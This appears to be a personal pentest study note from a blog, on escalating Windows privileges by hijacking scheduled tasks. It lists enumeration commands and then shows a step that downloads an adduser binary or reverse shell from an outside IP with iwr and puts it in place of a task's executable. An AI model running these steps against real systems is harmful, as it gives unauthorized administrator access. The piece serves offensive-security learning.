---
layout: post
title: Windows Scheduled Paths
titledate: 09/16/23
tags: ["infosec","offsec", "privesc", "powershell"]
---

on windows scheduled tasks are activities that get performed by windows that are meant to be scheduled

these activities can be a variety of things but can be leveraged for our purposes to perform privilege escalation

below are the 3 criteria we must consider when deciding if we can leverage privesc

1. which account executes the task
2. what conditions or triggers are needed for the task to execute
3. when these conditions are met, what actions get executed

if the attack is executed in the context of a current non admin user then we most likely can not escalate privs from it, however, if it is a system or admin acct then we may be able to

let's view the tasks

    PS > schtasks /query /fo LIST /v

as always it will be helpful to know which users are administrators so these cmds are helpful

    PS > net user
    PS > Get-LocalGroupMember Administrators

this will provide us with a load of useful information like, the taskname, the time it is scheduled to run, if it was successful last run, who created it, where it executes from, and what is executing

we can check the permissions on the directory of the task 

    PS > icacls C:\Users\steve\Pictures\mytask.exe

so lets copy our adduser exe over (or a reverse shell)

    PS > iwr -Uri http://192.168.1.1/adduser.exe -Outfile mytask.exe

and then move it to the directory the task executes from

    PS > move .\mytask.exe .\Pictures\

now to get our code to execute we must wait for the next scheduled execution of the task - check the execution parameters , it may be on a reboot or something that can be forced with sc.exe

### TODO: need to write a script to parse the output of the tasks output to be more useful

### NOTE: can try filtering for dirs with perms like C:\Users etc